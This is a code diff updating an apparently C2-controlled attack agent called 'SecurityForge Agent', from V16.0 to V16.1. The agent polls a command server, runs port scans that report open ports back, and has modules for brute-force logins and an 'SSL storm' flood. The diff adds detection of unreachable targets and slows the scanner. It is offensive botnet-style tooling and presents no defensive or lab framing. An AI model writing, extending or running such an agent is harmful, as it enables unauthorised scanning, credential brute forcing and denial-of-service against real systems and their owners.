@@ -1,7 +1,7 @@
 /**
- * SECURITYFORGE AGENT V16.0 (MASTER KEY)
- * - V16.0: Fixed Log Flushing, Login Auth Types, 100% Brute Logic
- * - V15.5: Hunter-Killer Success Detection
+ * SECURITYFORGE AGENT V16.1 (INSIGHT)
+ * - V16.1: Unreachable Target Detection, Detailed Port Scan Logs
+ * - V16.0: Master Key Login Logic
  */
 const https = require('https');
 const http = require('http');
@@ -34,7 +34,7 @@ const JUNK_DATA_SMALL = Buffer.alloc(1024 * 1, 'x');
 
 // --- KEEPALIVE SERVER ---
 const PORT = process.env.PORT || 3000;
-http.createServer((req, res) => { res.writeHead(200); res.end('SecurityForge Agent V16.0 ACTIVE'); })
+http.createServer((req, res) => { res.writeHead(200); res.end('SecurityForge Agent V16.1 ACTIVE'); })
     .listen(PORT, () => console.log(`[SYSTEM] Agent listening on port ${PORT}`));
 
 // --- HELPER: NATIVE SUPABASE ---
@@ -72,7 +72,7 @@ const supabaseRequest = (method, pathStr, body = null) => {
     });
 };
 
-console.log('\x1b[35m[AGENT] Initialized V16.0 (Master Key). Polling C2...\x1b[0m');
+console.log('\x1b[35m[AGENT] Initialized V16.1 (Insight). Polling C2...\x1b[0m');
 
 let activeJob = null;
 let activeLoop = null;
@@ -106,6 +106,7 @@ const startAttack = (job) => {
     let jobLatencySum = 0;
     let jobReqsForLatency = 0;
     let jobMaxLatency = 0;
+    let consecutiveFailures = 0; // V16.1
     
     // --- MODULE: SHADOW OPS & RECON ---
     if (job.use_dns_reaper) {
@@ -149,14 +150,20 @@ const startAttack = (job) => {
             socket.setTimeout(2000);
             socket.on('connect', () => {
                 logToC2(`[OPEN] Port ${port} is OPEN on ${targetHost}`);
-                jobSuccess++; totalRequests++; socket.destroy();
+                jobSuccess++; totalRequests++; socket.destroy(); consecutiveFailures = 0;
             });
-            socket.on('timeout', () => { socket.destroy(); totalRequests++; });
-            socket.on('error', () => { totalRequests++; });
+            socket.on('timeout', () => { 
+                socket.destroy(); totalRequests++; consecutiveFailures++;
+                if (consecutiveFailures === 10) logToC2(`[ERROR] Target Unreachable. Are you scanning a Local IP from Cloud?`);
+            });
+            socket.on('error', () => { 
+                totalRequests++; consecutiveFailures++; 
+                if (consecutiveFailures === 10) logToC2(`[ERROR] Target Connection Failed. Check Firewall.`);
+            });
             socket.connect(port, targetHost);
-            if (running) setTimeout(() => scanPort(idx + 1), 50);
+            if (running) setTimeout(() => scanPort(idx + 1), 100); // Slower for logging accuracy
         }
-        for(let i=0; i<50; i++) scanPort(i);
+        for(let i=0; i<10; i++) scanPort(i); // Fewer threads for accuracy
     }
     else if (job.use_ssl_storm) {
         let targetUrl; try { targetUrl = new URL(job.target); } catch(e) { return; }
